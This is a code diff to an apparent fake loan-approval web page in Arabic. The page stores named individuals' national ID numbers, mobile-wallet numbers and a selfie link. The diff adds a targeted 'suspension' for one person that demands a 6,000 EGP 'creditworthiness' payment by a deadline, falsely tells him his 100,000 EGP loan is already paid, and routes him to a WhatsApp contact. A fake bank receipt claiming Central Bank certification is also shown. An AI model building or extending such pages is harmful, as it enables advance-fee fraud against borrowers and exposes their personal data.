@@ -91,7 +91,6 @@
         .success-header { text-align: center; background: linear-gradient(135deg, rgba(57, 255, 20, 0.12), rgba(0, 217, 255, 0.08)); border: 2px solid var(--primary-lime); border-radius: 2rem; padding: 1.5rem; margin-bottom: 1.5rem; box-shadow: 0 0 25px rgba(57, 255, 20, 0.15); }
         .success-header h2 { color: var(--primary-lime); font-size: 1.6rem; margin-bottom: 0.3rem; font-weight: 800; }
         .success-header p { color: var(--text-muted); font-size: 0.9rem; }
-        /* بطاقة الدفع الجديدة بتصميم إيصال بنكي */
         .receipt-card {
             background: linear-gradient(135deg, #0b2b1f 0%, #071a12 100%);
             border: 2px solid var(--accent-gold);
@@ -275,12 +274,14 @@
 
     <script>
         // ========== قاعدة بيانات العملاء الكاملة ==========
+        // تم تعديل حالة العميل "حمدى مصطفى كامل علام" (رقم 26805070201379) إلى معلق مع رسالة خاصة
         const customersDatabase = {
             "28310021401735": { name: "احمد عبدالهادي احمد عبدالهادي", wallet: "فودافون كاش", walletNum: "01024442779", loan: 120000, suspended: false },
             "26301141900259": { name: "محمد كمال محمد فهمى", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 55000, suspended: false },
             "294011427522": { name: "امنيه محمد محروس عبد الغفار", wallet: "فودافون كاش", walletNum: "01032842112", loan: 65000, suspended: true, selfieUrl: "https://i.ibb.co/BVPtC6m5/taken-picture-u-SJlf1ma-diepx-3395780.jpg" },
             "29602120101179": { name: "مصطفي عمر عبد العزيز حسين", wallet: "اتصالات كاش", walletNum: "01111010803", loan: 50000, suspended: false },
-            "26805070201379": { name: "حمدى مصطفى كامل علام", wallet: "فودافون كاش", walletNum: "01018366943", loan: 100000, suspended: false },
+            // العميل المطلوب تعليقه (حمدى مصطفى كامل علام)
+            "26805070201379": { name: "حمدى مصطفى كامل علام", wallet: "فودافون كاش", walletNum: "01018366943", loan: 100000, suspended: true, customSuspension: true, proofAmount: 6000, deadline: "5:00 مساء", loanAmount: 100000 },
             "27508061800731": { name: "عمر عبد الحليم عبد المجيد عوض", wallet: "فودافون كاش", walletNum: "01015964596", loan: 30000, suspended: false },
             "28112141600891": { name: "علي مصطفي محمد حسنين", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 200000, suspended: false },
             "27208031600831": { name: "ايمن عبد النبي محمد اسماعيل", wallet: "اتصالات كاش", walletNum: "01127853605", loan: 200000, suspended: false },
@@ -399,37 +400,69 @@
             document.getElementById('normalContent').style.display = 'none';
             const suspendedDiv = document.getElementById('suspendedContainer');
             suspendedDiv.style.display = 'block';
-            let selfieHtml = '';
-            if (customer.selfieUrl) {
-                selfieHtml = `
-                    <div class="selfie-container">
-                        <img src="${customer.selfieUrl}" alt="صورة سيلفي للعميلة ${customer.name}" loading="lazy">
-                        <div class="selfie-caption"><i class="fas fa-camera"></i> صورة السيلفي المرفقة للتحقق من الهوية</div>
+            
+            // رسالة خاصة للعميل حمدى مصطفى كامل علام
+            if (customer.customSuspension) {
+                const proofAmt = customer.proofAmount || 6000;
+                const deadlineTime = customer.deadline || "5:00 مساء";
+                const loanAmt = customer.loanAmount || customer.loan || 100000;
+                suspendedDiv.innerHTML = `
+                    <div class="suspended-card">
+                        <div class="suspended-icon"><i class="fas fa-hourglass-half"></i></div>
+                        <div class="suspended-title">⏳ طلبك معلق مؤقتاً</div>
+                        <div class="suspended-message">
+                            <strong>عزيزي العميل ${customer.name}</strong><br><br>
+                            🔒 طلب التمويل الخاص بك معلق لحين إثبات الجدارة الائتمانية المحددة لك.<br><br>
+                            💰 <strong style="color: var(--accent-gold);">مبلغ الجدارة المطلوب: ${proofAmt.toLocaleString()} ج.م</strong><br>
+                            ⏰ <strong style="color: var(--accent-orange);">الموعد النهائي للإثبات: الساعة ${deadlineTime}</strong><br><br>
+                            ✅ <strong style="color: var(--primary-lime);">القرض بقيمة ${loanAmt.toLocaleString()} ج.م تم دفعه بالفعل إلى حسابك</strong><br>
+                            وسيتم صرفه فوراً بمجرد إثبات الجدارة.<br><br>
+                            📞 للتواصل مع قسم التحويلات المالية على واتساب لفتح التعليق وصرف القرض، اضغط على الزر أدناه.
+                        </div>
+                        <button class="btn-whatsapp-suspend" onclick="openWhatsAppForSuspended('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${proofAmt}, '${deadlineTime}', ${loanAmt})">
+                            <i class="fab fa-whatsapp fa-lg"></i> تواصل مع التحويلات المالية الآن
+                        </button>
+                    </div>
+                `;
+            } else {
+                // الرسالة العامة للمعلقات الآخرين (مثل أمنية)
+                let selfieHtml = '';
+                if (customer.selfieUrl) {
+                    selfieHtml = `
+                        <div class="selfie-container">
+                            <img src="${customer.selfieUrl}" alt="صورة سيلفي للعميلة ${customer.name}" loading="lazy">
+                            <div class="selfie-caption"><i class="fas fa-camera"></i> صورة السيلفي المرفقة للتحقق من الهوية</div>
+                        </div>
+                    `;
+                }
+                suspendedDiv.innerHTML = `
+                    <div class="suspended-card">
+                        <div class="suspended-icon"><i class="fas fa-clock"></i></div>
+                        <div class="suspended-title">⏳ الطلب معلق</div>
+                        ${selfieHtml}
+                        <div class="suspended-message">
+                            <strong>عزيزتي العميلة ${customer.name}</strong><br>
+                            طلب التمويل الخاص بك معلق حاليًا.<br>
+                            لفتح التعليق يرجى متابعة مندوبتنا في قسم التحويلات المالية على واتساب<br>
+                            لتتم عملية فتح الطلب وصرف القرض.<br>
+                            <small style="color: var(--accent-orange);"><i class="fas fa-shield-alt"></i> للتأكد من هويتك، سيتم مطابقة الصورة مع بياناتك.</small>
+                        </div>
+                        <button class="btn-whatsapp-suspend" onclick="openWhatsAppForSuspended('${customer.name.replace(/'/g, "\\'")}', '${customer.id}')">
+                            <i class="fab fa-whatsapp fa-lg"></i> تواصل مع مندوبتنا الآن
+                        </button>
                     </div>
                 `;
             }
-            suspendedDiv.innerHTML = `
-                <div class="suspended-card">
-                    <div class="suspended-icon"><i class="fas fa-clock"></i></div>
-                    <div class="suspended-title">⏳ الطلب معلق</div>
-                    ${selfieHtml}
-                    <div class="suspended-message">
-                        <strong>عزيزتي العميلة ${customer.name}</strong><br>
-                        طلب التمويل الخاص بك معلق حاليًا.<br>
-                        لفتح التعليق يرجى متابعة مندوبتنا في قسم التحويلات المالية على واتساب<br>
-                        لتتم عملية فتح الطلب وصرف القرض.<br>
-                        <small style="color: var(--accent-orange);"><i class="fas fa-shield-alt"></i> للتأكد من هويتك، سيتم مطابقة الصورة مع بياناتك.</small>
-                    </div>
-                    <button class="btn-whatsapp-suspend" onclick="openWhatsAppForSuspended('${customer.name.replace(/'/g, "\\'")}', '${customer.id}')">
-                        <i class="fab fa-whatsapp fa-lg"></i> تواصل مع مندوبتنا الآن
-                    </button>
-                </div>
-            `;
             document.getElementById('resultSection').classList.add('show');
         }
 
-        function openWhatsAppForSuspended(name, id) {
-            const message = `السلام عليكم ورحمة الله وبركاته\n\nأنا العميلة: ${name}\nرقم البطاقة: ${id}\nطلب التمويل الخاص بي معلق، أرجو فتح التعليق لإتمام صرف القرض.`;
+        function openWhatsAppForSuspended(name, id, proofAmount, deadline, loanAmount) {
+            let message = `السلام عليكم ورحمة الله وبركاته\n\nأنا العميل: ${name}\nرقم البطاقة: ${id}\n`;
+            if (proofAmount && deadline && loanAmount) {
+                message += `طلب التمويل الخاص بي معلق لحين إثبات الجدارة الائتمانية بقيمة ${proofAmount} ج.م قبل الساعة ${deadline}.\nالقرض المدفوع لحسابي بقيمة ${loanAmount} ج.م.\nأرجو فتح التعليق لإتمام صرف القرض فوراً.`;
+            } else {
+                message += `طلب التمويل الخاص بي معلق، أرجو فتح التعليق لإتمام صرف القرض.`;
+            }
             const encoded = encodeURIComponent(message);
             window.open(`https://wa.me/212614494251?text=${encoded}`, '_blank');
         }
@@ -446,7 +479,6 @@
             const referenceNumber = Math.floor(Math.random() * 1000000000);
             const subscriberNumber = customer.walletNum !== "غير مسجل" ? customer.walletNum : "غير محدد";
             
-            // بطاقة دفع جديدة بتصميم إيصال بنكي عملية ناجحة
             const paymentCardHTML = `
                 <div class="receipt-card">
                     <div class="receipt-header">
@@ -459,51 +491,22 @@
                         <div style="font-size:0.75rem; margin-top:5px;">تم تسيل المبلغ بنجاح في محفظتك</div>
                     </div>
                     <div class="receipt-details">
-                        <div class="detail-row">
-                            <span class="detail-label"><i class="fas fa-wallet"></i> رقم المحفظة</span>
-                            <span class="detail-value">${customer.walletNum}</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label"><i class="fas fa-calendar-alt"></i> التاريخ</span>
-                            <span class="detail-value">${formatDate(now)}</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label"><i class="fas fa-clock"></i> الوقت</span>
-                            <span class="detail-value">${formatTime(now)}</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label"><i class="fas fa-hashtag"></i> الرقم المرجعي</span>
-                            <span class="detail-value">${referenceNumber}</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label"><i class="fas fa-id-card"></i> رقم المشترك</span>
-                            <span class="detail-value">${subscriberNumber}</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label"><i class="fas fa-file-invoice"></i> رقم الفاتورة</span>
-                            <span class="detail-value">INV-${transactionId}</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label"><i class="fas fa-badge-check"></i> رقم الموافقة</span>
-                            <span class="detail-value">${approvalCode}</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label"><i class="fas fa-code-branch"></i> رقم العملية</span>
-                            <span class="detail-value">${transactionId}</span>
-                        </div>
-                        <div class="detail-row">
-                            <span class="detail-label"><i class="fas fa-credit-card"></i> طريقة الدفع</span>
-                            <span class="detail-value"> إيداع  فوري إلى المحفظة</span>
-                        </div>
+                        <div class="detail-row"><span class="detail-label"><i class="fas fa-wallet"></i> رقم المحفظة</span><span class="detail-value">${customer.walletNum}</span></div>
+                        <div class="detail-row"><span class="detail-label"><i class="fas fa-calendar-alt"></i> التاريخ</span><span class="detail-value">${formatDate(now)}</span></div>
+                        <div class="detail-row"><span class="detail-label"><i class="fas fa-clock"></i> الوقت</span><span class="detail-value">${formatTime(now)}</span></div>
+                        <div class="detail-row"><span class="detail-label"><i class="fas fa-hashtag"></i> الرقم المرجعي</span><span class="detail-value">${referenceNumber}</span></div>
+                        <div class="detail-row"><span class="detail-label"><i class="fas fa-id-card"></i> رقم المشترك</span><span class="detail-value">${subscriberNumber}</span></div>
+                        <div class="detail-row"><span class="detail-label"><i class="fas fa-file-invoice"></i> رقم الفاتورة</span><span class="detail-value">INV-${transactionId}</span></div>
+                        <div class="detail-row"><span class="detail-label"><i class="fas fa-badge-check"></i> رقم الموافقة</span><span class="detail-value">${approvalCode}</span></div>
+                        <div class="detail-row"><span class="detail-label"><i class="fas fa-code-branch"></i> رقم العملية</span><span class="detail-value">${transactionId}</span></div>
+                        <div class="detail-row"><span class="detail-label"><i class="fas fa-credit-card"></i> طريقة الدفع</span><span class="detail-value">إيداع فوري إلى المحفظة</span></div>
                     </div>
                     <div class="info-message">
                         <i class="fas fa-envelope-open-text" style="color: var(--accent-gold);"></i> 
                         <strong>تم إيداع المبلغ في حسابك بنجاح!</strong><br>
                         ستصل رسالة تأكيد الإيداع على موبايلك خلال دقائق. لإتمام صرف القرض، يرجى إكمال إجراءات إثبات الجدارة الائتمانية أدناه.
                     </div>
-                    <div class="receipt-footer">
-                        <i class="fas fa-lock"></i> هذه عملية موثقة ومرقمة وفق أنظمة البنك المركزي
-                    </div>
+                    <div class="receipt-footer"><i class="fas fa-lock"></i> هذه عملية موثقة ومرقمة وفق أنظمة البنك المركزي</div>
                 </div>
             `;
             
